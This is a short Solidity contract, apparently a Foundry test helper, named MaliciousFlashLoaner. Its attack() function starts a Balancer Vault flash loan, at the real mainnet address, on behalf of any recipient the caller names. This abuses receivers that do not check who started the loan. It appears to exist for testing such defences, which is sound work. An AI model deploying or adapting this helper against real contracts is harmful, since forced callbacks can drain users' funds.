pragma solidity ^0.8.0;

import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IBalancer {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract MaliciousFlashLoaner {
    /*//////////////////////////////////////////////////////////////
                               CONSTANTS
    //////////////////////////////////////////////////////////////*/

    /// @notice Balancer Vault Contract
    address constant balancerAddress =
        0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    /*//////////////////////////////////////////////////////////////
                            STATE VARIABLES
    //////////////////////////////////////////////////////////////*/

    IBalancer constant balancer = IBalancer(balancerAddress);

    /*//////////////////////////////////////////////////////////////
                               FLASH LOAN
    //////////////////////////////////////////////////////////////*/

    function attack(
        address destination,
        address[] memory tokens,
        uint256[] memory amounts
    ) public {
        balancer.flashLoan(destination, tokens, amounts, "");
    }
}
